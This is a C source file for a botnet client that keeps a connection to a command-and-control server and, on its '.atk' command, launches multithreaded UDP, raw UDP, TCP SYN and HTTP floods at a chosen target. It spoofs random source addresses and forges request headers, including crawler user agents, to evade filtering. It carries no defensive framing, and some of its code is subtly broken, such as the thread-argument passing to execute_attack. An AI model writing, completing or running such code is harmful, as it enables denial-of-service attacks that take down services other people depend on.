#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <errno.h>
#include <sys/time.h>
#include <fcntl.h>

#define MAX_PACKET 65535
#define DEFAULT_THREADS 10
#define DEFAULT_SIZE 1400
#define MAX_THREADS 100

typedef struct {
    char target[64];
    int port;
    int duration;
    int packet_size;
    int thread_id;
    int use_raw;
    char host[128];
    char path[256];
    int http_mode;
    int attack_id;
} attack_args_t;

volatile int attack_running = 1;
volatile unsigned long long packets_sent = 0;
volatile unsigned long long bytes_sent = 0;
int g_sockfd = -1;
pthread_mutex_t sock_mutex = PTHREAD_MUTEX_INITIALIZER;

const char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.193 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.5.3206.63",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; Facebookbot/1.0; +http://www.facebook.com/facebookbot)",
    "Mozilla/5.0 (compatible; Twitterbot/1.0; +http://twitter.com/help/crawling)",
    "Mozilla/5.0 (compatible; Applebot/1.0; +http://www.apple.com/go/applebot)",
    "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot)",
    "Mozilla/5.0 (compatible; SemrushBot/1.0; +http://www.semrush.com/bot.html)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
};

#define NUM_USER_AGENTS (sizeof(user_agents) / sizeof(user_agents[0]))

unsigned short checksum(unsigned short *buffer, int size) {
    unsigned long sum = 0;
    while (size > 1) {
        sum += *buffer++;
        size -= 2;
    }
    if (size == 1) {
        sum += *(unsigned char *)buffer;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void random_payload(unsigned char *buffer, int size) {
    for (int i = 0; i < size; i++) {
        buffer[i] = rand() & 0xFF;
    }
}

uint32_t random_ip() {
    uint32_t ip;
    do {
        ip = (rand() & 0xFF) << 24 |
             (rand() & 0xFF) << 16 |
             (rand() & 0xFF) << 8 |
             (rand() & 0xFF);
    } while (ip == 0x0100007F || ip == 0x0A000000 || ip == 0xAC100000 || ip == 0xC0A80000);
    return ip;
}

void build_http_request(char *buffer, char *host, char *path, int size, int ua_index) {
    int r1 = rand() % 255, r2 = rand() % 255, r3 = rand() % 255, r4 = rand() % 255;
    int r5 = rand() % 255, r6 = rand() % 255, r7 = rand() % 255, r8 = rand() % 255;
    int r9 = rand() % 255, r10 = rand() % 255, r11 = rand() % 255, r12 = rand() % 255;
    
    snprintf(buffer, size,
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "Accept-Encoding: gzip, deflate, br\r\n"
        "Connection: keep-alive\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "Cache-Control: no-cache, no-store, must-revalidate\r\n"
        "Pragma: no-cache\r\n"
        "X-Forwarded-For: %d.%d.%d.%d\r\n"
        "X-Real-IP: %d.%d.%d.%d\r\n"
        "X-Client-IP: %d.%d.%d.%d\r\n"
        "Referer: http://%s/\r\n"
        "\r\n",
        path, host, user_agents[ua_index % NUM_USER_AGENTS],
        r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12,
        host
    );
}

void *http_flood_thread(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    char packet[MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    char *payload;
    int packet_size;
    time_t end_time;
    char http_request[4096];
    int ua_counter = rand() % NUM_USER_AGENTS;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        return NULL;
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(sockfd);
        return NULL;
    }

    int bufsize = 1024 * 1024 * 16;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));

    memset(packet, 0, MAX_PACKET);

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        close(sockfd);
        return NULL;
    }

    end_time = time(NULL) + args->duration;
    int sent_count = 0;

    while (attack_running && time(NULL) < end_time) {
        build_http_request(http_request, args->host, args->path, sizeof(http_request), ua_counter++);
        int http_len = strlen(http_request);
        
        packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + http_len;
        
        if (packet_size > MAX_PACKET) {
            packet_size = MAX_PACKET;
            http_len = packet_size - sizeof(struct iphdr) - sizeof(struct tcphdr);
        }
        
        ip_header = (struct iphdr *)packet;
        tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
        payload = (char *)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr));

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = htons(packet_size);
        ip_header->id = htons(rand() & 0xFFFF);
        ip_header->frag_off = 0;
        ip_header->ttl = 255;
        ip_header->protocol = IPPROTO_TCP;
        ip_header->check = 0;
        ip_header->saddr = random_ip();
        ip_header->daddr = target_addr.sin_addr.s_addr;

        tcp_header->source = htons(1024 + (rand() % 64511));
        tcp_header->dest = htons(args->port);
        tcp_header->seq = rand();
        tcp_header->ack_seq = 0;
        tcp_header->doff = 5;
        tcp_header->syn = 1;
        tcp_header->window = htons(65535);
        tcp_header->check = 0;
        tcp_header->urg_ptr = 0;

        memcpy(payload, http_request, http_len);

        ip_header->check = checksum((unsigned short *)packet, packet_size);

        int result = sendto(sockfd, packet, packet_size, 0,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
        
        if (result > 0) {
            packets_sent++;
            bytes_sent += result;
            sent_count++;
        }

        if (sent_count % 10 == 0) {
            usleep(1);
        }
    }

    close(sockfd);
    return NULL;
}

void *raw_udp_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    char packet[MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct udphdr *udp_header;
    unsigned char *payload;
    int packet_size;
    time_t end_time;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        return NULL;
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(sockfd);
        return NULL;
    }

    int bufsize = 1024 * 1024 * 8;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));

    memset(packet, 0, MAX_PACKET);
    packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + args->packet_size;

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        close(sockfd);
        return NULL;
    }

    end_time = time(NULL) + args->duration;
    int sent_count = 0;

    while (attack_running && time(NULL) < end_time) {
        ip_header = (struct iphdr *)packet;
        udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
        payload = (unsigned char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = htons(packet_size);
        ip_header->id = htons(rand() & 0xFFFF);
        ip_header->frag_off = 0;
        ip_header->ttl = 255;
        ip_header->protocol = IPPROTO_UDP;
        ip_header->check = 0;
        ip_header->saddr = random_ip();
        ip_header->daddr = target_addr.sin_addr.s_addr;

        udp_header->source = htons(1024 + (rand() % 64511));
        udp_header->dest = htons(args->port);
        udp_header->len = htons(sizeof(struct udphdr) + args->packet_size);
        udp_header->check = 0;

        random_payload(payload, args->packet_size);
        ip_header->check = checksum((unsigned short *)packet, packet_size);

        int result = sendto(sockfd, packet, packet_size, 0,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
        
        if (result > 0) {
            packets_sent++;
            bytes_sent += result;
            sent_count++;
        }

        if (sent_count % 1000 == 0) {
            usleep(1);
        }
    }

    close(sockfd);
    return NULL;
}

void *udp_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    struct sockaddr_in target_addr;
    unsigned char *packet;
    time_t end_time;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        return NULL;
    }

    int bufsize = 1024 * 1024 * 8;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        close(sockfd);
        return NULL;
    }

    packet = malloc(args->packet_size);
    end_time = time(NULL) + args->duration;
    int sent_count = 0;

    while (attack_running && time(NULL) < end_time) {
        random_payload(packet, args->packet_size);
        int result = sendto(sockfd, packet, args->packet_size, 0,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
        if (result > 0) {
            packets_sent++;
            bytes_sent += result;
            sent_count++;
        }
        usleep(1);
    }

    free(packet);
    close(sockfd);
    return NULL;
}

void *raw_tcp_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    char packet[MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    int packet_size;
    time_t end_time;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        return NULL;
    }

    int one = 1;
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    memset(packet, 0, MAX_PACKET);
    packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr);

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);

    end_time = time(NULL) + args->duration;
    int sent_count = 0;

    while (attack_running && time(NULL) < end_time) {
        ip_header = (struct iphdr *)packet;
        tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = htons(packet_size);
        ip_header->id = htons(rand() & 0xFFFF);
        ip_header->frag_off = 0;
        ip_header->ttl = 255;
        ip_header->protocol = IPPROTO_TCP;
        ip_header->check = 0;
        ip_header->saddr = random_ip();
        ip_header->daddr = target_addr.sin_addr.s_addr;

        tcp_header->source = htons(1024 + (rand() % 64511));
        tcp_header->dest = htons(args->port);
        tcp_header->seq = rand();
        tcp_header->ack_seq = rand();
        tcp_header->doff = 5;
        tcp_header->syn = 1;
        tcp_header->window = htons(65535);
        tcp_header->check = 0;
        tcp_header->urg_ptr = 0;

        ip_header->check = checksum((unsigned short *)packet, packet_size);

        if (sendto(sockfd, packet, packet_size, 0,
                   (struct sockaddr *)&target_addr, sizeof(target_addr)) > 0) {
            packets_sent++;
            bytes_sent += packet_size;
            sent_count++;
        }
        usleep(1);
    }

    close(sockfd);
    return NULL;
}

void parse_url(char *url, char *host, char *path) {
    char *slash = strchr(url, '/');
    if (slash == NULL) {
        strcpy(host, url);
        strcpy(path, "/");
    } else {
        int host_len = slash - url;
        strncpy(host, url, host_len);
        host[host_len] = '\0';
        strcpy(path, slash);
        if (strlen(path) == 0) {
            strcpy(path, "/");
        }
    }
}

void execute_attack(char *target, int port, int duration, int threads, int packet_size, int use_raw, int use_tcp, int use_http, char *host, char *path) {
    srand(time(NULL) ^ getpid() ^ (unsigned long)pthread_self());

    pthread_t *threads_arr = malloc(threads * sizeof(pthread_t));
    attack_args_t *args = malloc(threads * sizeof(attack_args_t));

    attack_running = 1;
    packets_sent = 0;
    bytes_sent = 0;

    for (int i = 0; i < threads; i++) {
        strncpy(args[i].target, target, sizeof(args[i].target) - 1);
        args[i].target[sizeof(args[i].target) - 1] = '\0';
        args[i].port = port;
        args[i].duration = duration;
        args[i].packet_size = packet_size;
        args[i].thread_id = i;
        args[i].use_raw = use_raw;
        args[i].http_mode = use_http;
        
        if (use_http) {
            strncpy(args[i].host, host, sizeof(args[i].host) - 1);
            args[i].host[sizeof(args[i].host) - 1] = '\0';
            strncpy(args[i].path, path, sizeof(args[i].path) - 1);
            args[i].path[sizeof(args[i].path) - 1] = '\0';
        }

        if (use_http) {
            pthread_create(&threads_arr[i], NULL, http_flood_thread, &args[i]);
        } else if (use_tcp) {
            pthread_create(&threads_arr[i], NULL, raw_tcp_flood, &args[i]);
        } else if (use_raw) {
            pthread_create(&threads_arr[i], NULL, raw_udp_flood, &args[i]);
        } else {
            pthread_create(&threads_arr[i], NULL, udp_flood, &args[i]);
        }
    }

    sleep(duration);
    attack_running = 0;

    for (int i = 0; i < threads; i++) {
        pthread_join(threads_arr[i], NULL);
    }

    free(threads_arr);
    free(args);
}

int send_to_cnc(int sock, const char *msg) {
    pthread_mutex_lock(&sock_mutex);
    int ret = send(sock, msg, strlen(msg), 0);
    pthread_mutex_unlock(&sock_mutex);
    return ret;
}

int recv_from_cnc(int sock, char *buffer, int size) {
    pthread_mutex_lock(&sock_mutex);
    int ret = recv(sock, buffer, size - 1, 0);
    pthread_mutex_unlock(&sock_mutex);
    return ret;
}

int main(int argc, char *argv[]) {
    char cnc_ip[64] = "127.0.0.1";
    int cnc_port = 4087;
    char arch[32] = "linux";
    char version[32] = "1.0";
    
    if (argc >= 2) {
        strncpy(cnc_ip, argv[1], sizeof(cnc_ip) - 1);
    }
    if (argc >= 3) {
        cnc_port = atoi(argv[2]);
    }
    if (argc >= 4) {
        strncpy(arch, argv[3], sizeof(arch) - 1);
    }
    if (argc >= 5) {
        strncpy(version, argv[4], sizeof(version) - 1);
    }

    int sockfd;
    struct sockaddr_in server_addr;
    char buffer[1024];
    char send_buf[256];
    char target[64];
    int port, duration, threads, packet_size;
    char method[32];
    int use_raw = 0;
    int use_tcp = 0;
    int use_http = 0;
    char host[128];
    char path[256];
    char ip[INET_ADDRSTRLEN];
    time_t last_heartbeat = 0;
    time_t now;
    int connected = 0;
    int reconnect_attempts = 0;
    int attack_in_progress = 0;

    signal(SIGPIPE, SIG_IGN);

    while (1) {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            sleep(5);
            continue;
        }

        int keepalive = 1;
        int keepidle = 10;
        int keepintvl = 5;
        int keepcnt = 3;
        setsockopt(sockfd, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(keepalive));
        setsockopt(sockfd, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(keepidle));
        setsockopt(sockfd, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(keepintvl));
        setsockopt(sockfd, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(keepcnt));

        int flags = fcntl(sockfd, F_GETFL, 0);
        fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);

        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(cnc_port);
        if (inet_pton(AF_INET, cnc_ip, &server_addr.sin_addr) <= 0) {
            close(sockfd);
            sleep(5);
            continue;
        }

        if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            if (errno != EINPROGRESS) {
                close(sockfd);
                sleep(5);
                continue;
            }
            fd_set fdset;
            struct timeval tv;
            tv.tv_sec = 10;
            tv.tv_usec = 0;
            FD_ZERO(&fdset);
            FD_SET(sockfd, &fdset);
            if (select(sockfd + 1, NULL, &fdset, NULL, &tv) <= 0) {
                close(sockfd);
                sleep(5);
                continue;
            }
        }

        flags = fcntl(sockfd, F_GETFL, 0);
        fcntl(sockfd, F_SETFL, flags & ~O_NONBLOCK);

        reconnect_attempts = 0;
        connected = 1;
        g_sockfd = sockfd;

        snprintf(send_buf, sizeof(send_buf), "HBT|%s|%s\n", arch, version);
        send_to_cnc(sockfd, send_buf);

        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

        while (connected) {
            memset(buffer, 0, sizeof(buffer));
            int bytes = recv_from_cnc(sockfd, buffer, sizeof(buffer));

            if (bytes <= 0) {
                if (attack_in_progress) {
                    sleep(1);
                    continue;
                }
                connected = 0;
                break;
            }

            buffer[bytes] = '\0';

            now = time(NULL);
            if (now - last_heartbeat >= 20) {
                snprintf(send_buf, sizeof(send_buf), "HBT|%s|%s\n", arch, version);
                send_to_cnc(sockfd, send_buf);
                last_heartbeat = now;
            }

            if (strncmp(buffer, ".atk", 4) == 0) {
                char cmd_copy[512];
                strcpy(cmd_copy, buffer);
                
                char *token = strtok(cmd_copy, " ");
                token = strtok(NULL, " ");
                if (token) strcpy(target, token);
                
                token = strtok(NULL, " ");
                if (token) port = atoi(token);
                else port = 80;
                
                token = strtok(NULL, " ");
                if (token) duration = atoi(token);
                else duration = 30;
                
                token = strtok(NULL, " ");
                if (token) strcpy(method, token);
                else strcpy(method, "udp");
                
                token = strtok(NULL, " ");
                if (token) threads = atoi(token);
                else threads = 10;
                
                token = strtok(NULL, " ");
                if (token) packet_size = atoi(token);
                else packet_size = 1400;

                use_raw = 0;
                use_tcp = 0;
                use_http = 0;
                memset(host, 0, sizeof(host));
                memset(path, 0, sizeof(path));

                if (strcmp(method, "udp-bypass") == 0) {
                    use_raw = 1;
                } else if (strcmp(method, "tcp-bypass") == 0) {
                    use_tcp = 1;
                } else if (strcmp(method, "http-bypass") == 0) {
                    use_http = 1;
                    struct sockaddr_in test;
                    if (inet_pton(AF_INET, target, &test.sin_addr) <= 0) {
                        struct hostent *he = gethostbyname(target);
                        if (he != NULL) {
                            struct in_addr **addr_list = (struct in_addr **)he->h_addr_list;
                            strcpy(ip, inet_ntoa(*addr_list[0]));
                            parse_url(target, host, path);
                        }
                    } else {
                        strcpy(ip, target);
                        parse_url(target, host, path);
                    }
                    if (strlen(host) == 0) strcpy(host, target);
                    if (strlen(path) == 0) strcpy(path, "/");
                    strcpy(target, ip);
                } else if (strcmp(method, "tcp") == 0) {
                    use_tcp = 1;
                }

                attack_in_progress = 1;
                
                pthread_t attack_thread;
                pthread_create(&attack_thread, NULL, (void *(*)(void *))execute_attack, 
                    (void *)(long[]){ (long)target, port, duration, threads, packet_size, use_raw, use_tcp, use_http, (long)host, (long)path });
                pthread_detach(attack_thread);

                char report[128];
                snprintf(report, sizeof(report), "ATTACK_OK:started:%d\n", duration);
                send_to_cnc(sockfd, report);
            }
            else if (strncmp(buffer, ".stop", 5) == 0) {
                attack_running = 0;
                attack_in_progress = 0;
                send_to_cnc(sockfd, "STOP_OK\n");
            }
            else if (strcmp(buffer, "PING\n") == 0) {
                send_to_cnc(sockfd, "PONG\n");
            }
        }

        close(sockfd);
        g_sockfd = -1;
        connected = 0;
        attack_in_progress = 0;
        sleep(3);
    }

    return 0;
}
